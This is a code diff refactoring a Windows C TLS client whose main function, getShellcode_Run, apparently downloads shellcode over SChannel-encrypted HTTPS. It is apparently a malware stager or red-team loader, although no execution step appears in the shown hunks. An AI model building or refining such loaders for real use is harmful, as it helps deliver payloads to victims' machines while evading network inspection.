@@ -15,12 +15,17 @@ char ip[] = "www.google.com";
 char port[] = "443";
 char resource[] = "";
 
+// Cleanup function to handle resource deallocation
 void cleanup(SOCKET* ConnectSocket, CredHandle* hCred, CtxtHandle* hContext, char* encryptedBuf) {
     if (encryptedBuf) {
         free(encryptedBuf);
     }
-    DeleteSecurityContext(hContext);
-    FreeCredentialsHandle(hCred);
+    if (hContext->dwLower || hContext->dwUpper) {
+        DeleteSecurityContext(hContext);
+    }
+    if (hCred->dwLower || hCred->dwUpper) {
+        FreeCredentialsHandle(hCred);
+    }
     if (*ConnectSocket != INVALID_SOCKET) {
         closesocket(*ConnectSocket);
         *ConnectSocket = INVALID_SOCKET;
@@ -35,9 +40,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     struct addrinfo* ptr = NULL;
     struct addrinfo hints;
     char sendbuf[MAX_PATH] = "";
-    char sslBuf[32768];
+    char sslBuf[32768] = { 0 };
     char* encryptedBuf = NULL;
-    int iResult;
     int sslBufLen = 0;
     CredHandle hCred = { 0 };
     CtxtHandle hContext = { 0 };
@@ -69,7 +73,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
     // Initialize Winsock
     OutputDebugStringA("Initializing Winsock...\n");
-    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    int iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (iResult != 0) {
         char errorMsg[256];
         sprintf_s(errorMsg, 256, "WSAStartup failed: %d\n", iResult);
@@ -192,7 +196,8 @@ void getShellcode_Run(char* host, char* port, char* resource) {
     FreeContextBuffer(outBuffers[0].pvBuffer);
 
     // Handshake loop
-    do {
+    bool handshakeComplete = false;
+    while (!handshakeComplete) {
         OutputDebugStringA("Receiving handshake response...\n");
         iResult = recv(ConnectSocket, sslBuf + sslBufLen, sizeof(sslBuf) - sslBufLen, 0);
         if (iResult <= 0) {
@@ -225,7 +230,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
         secStatus = InitializeSecurityContextA(&hCred, &hContext, NULL, dwFlags, 0, 0, &inBuffer, 0, NULL, &outBuffer, &dwFlags, NULL);
         if (secStatus == SEC_E_OK) {
             OutputDebugStringA("SSL handshake completed successfully\n");
-            break;
+            handshakeComplete = true;
         }
         else if (secStatus == SEC_I_CONTINUE_NEEDED) {
             OutputDebugStringA("SSL handshake continuing...\n");
@@ -249,7 +254,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
             cleanup(&ConnectSocket, &hCred, &hContext, encryptedBuf);
             return;
         }
-    } while (true);
+    }
 
     // Log the negotiated cipher suite
     SecPkgContext_ConnectionInfo connInfo;
@@ -260,7 +265,6 @@ void getShellcode_Run(char* host, char* port, char* resource) {
             connInfo.dwProtocol, connInfo.aiCipher, connInfo.aiHash);
         OutputDebugStringA(logMsg);
 
-        // Map cipher suite to a human-readable name
         if (connInfo.dwProtocol == 0x0303) {  // TLS 1.2
             if (connInfo.aiCipher == 0x2F && connInfo.aiHash == 0x1) {
                 OutputDebugStringA("Cipher Suite: TLS_RSA_WITH_AES_128_CBC_SHA\n");
@@ -354,7 +358,6 @@ void getShellcode_Run(char* host, char* port, char* resource) {
 
     // Receive and decrypt the response
     sslBufLen = 0;
-    int processedBytes = 0;
     bool continueReceiving = true;
     while (continueReceiving) {
         OutputDebugStringA("Receiving response...\n");
@@ -373,7 +376,7 @@ void getShellcode_Run(char* host, char* port, char* resource) {
                 OutputDebugStringA(logMsg);
             }
 
-            processedBytes = 0;
+            int processedBytes = 0;
             while (processedBytes < sslBufLen) {
                 if (sslBufLen - processedBytes < 5) {
                     OutputDebugStringA("Incomplete TLS record header, need more data\n");
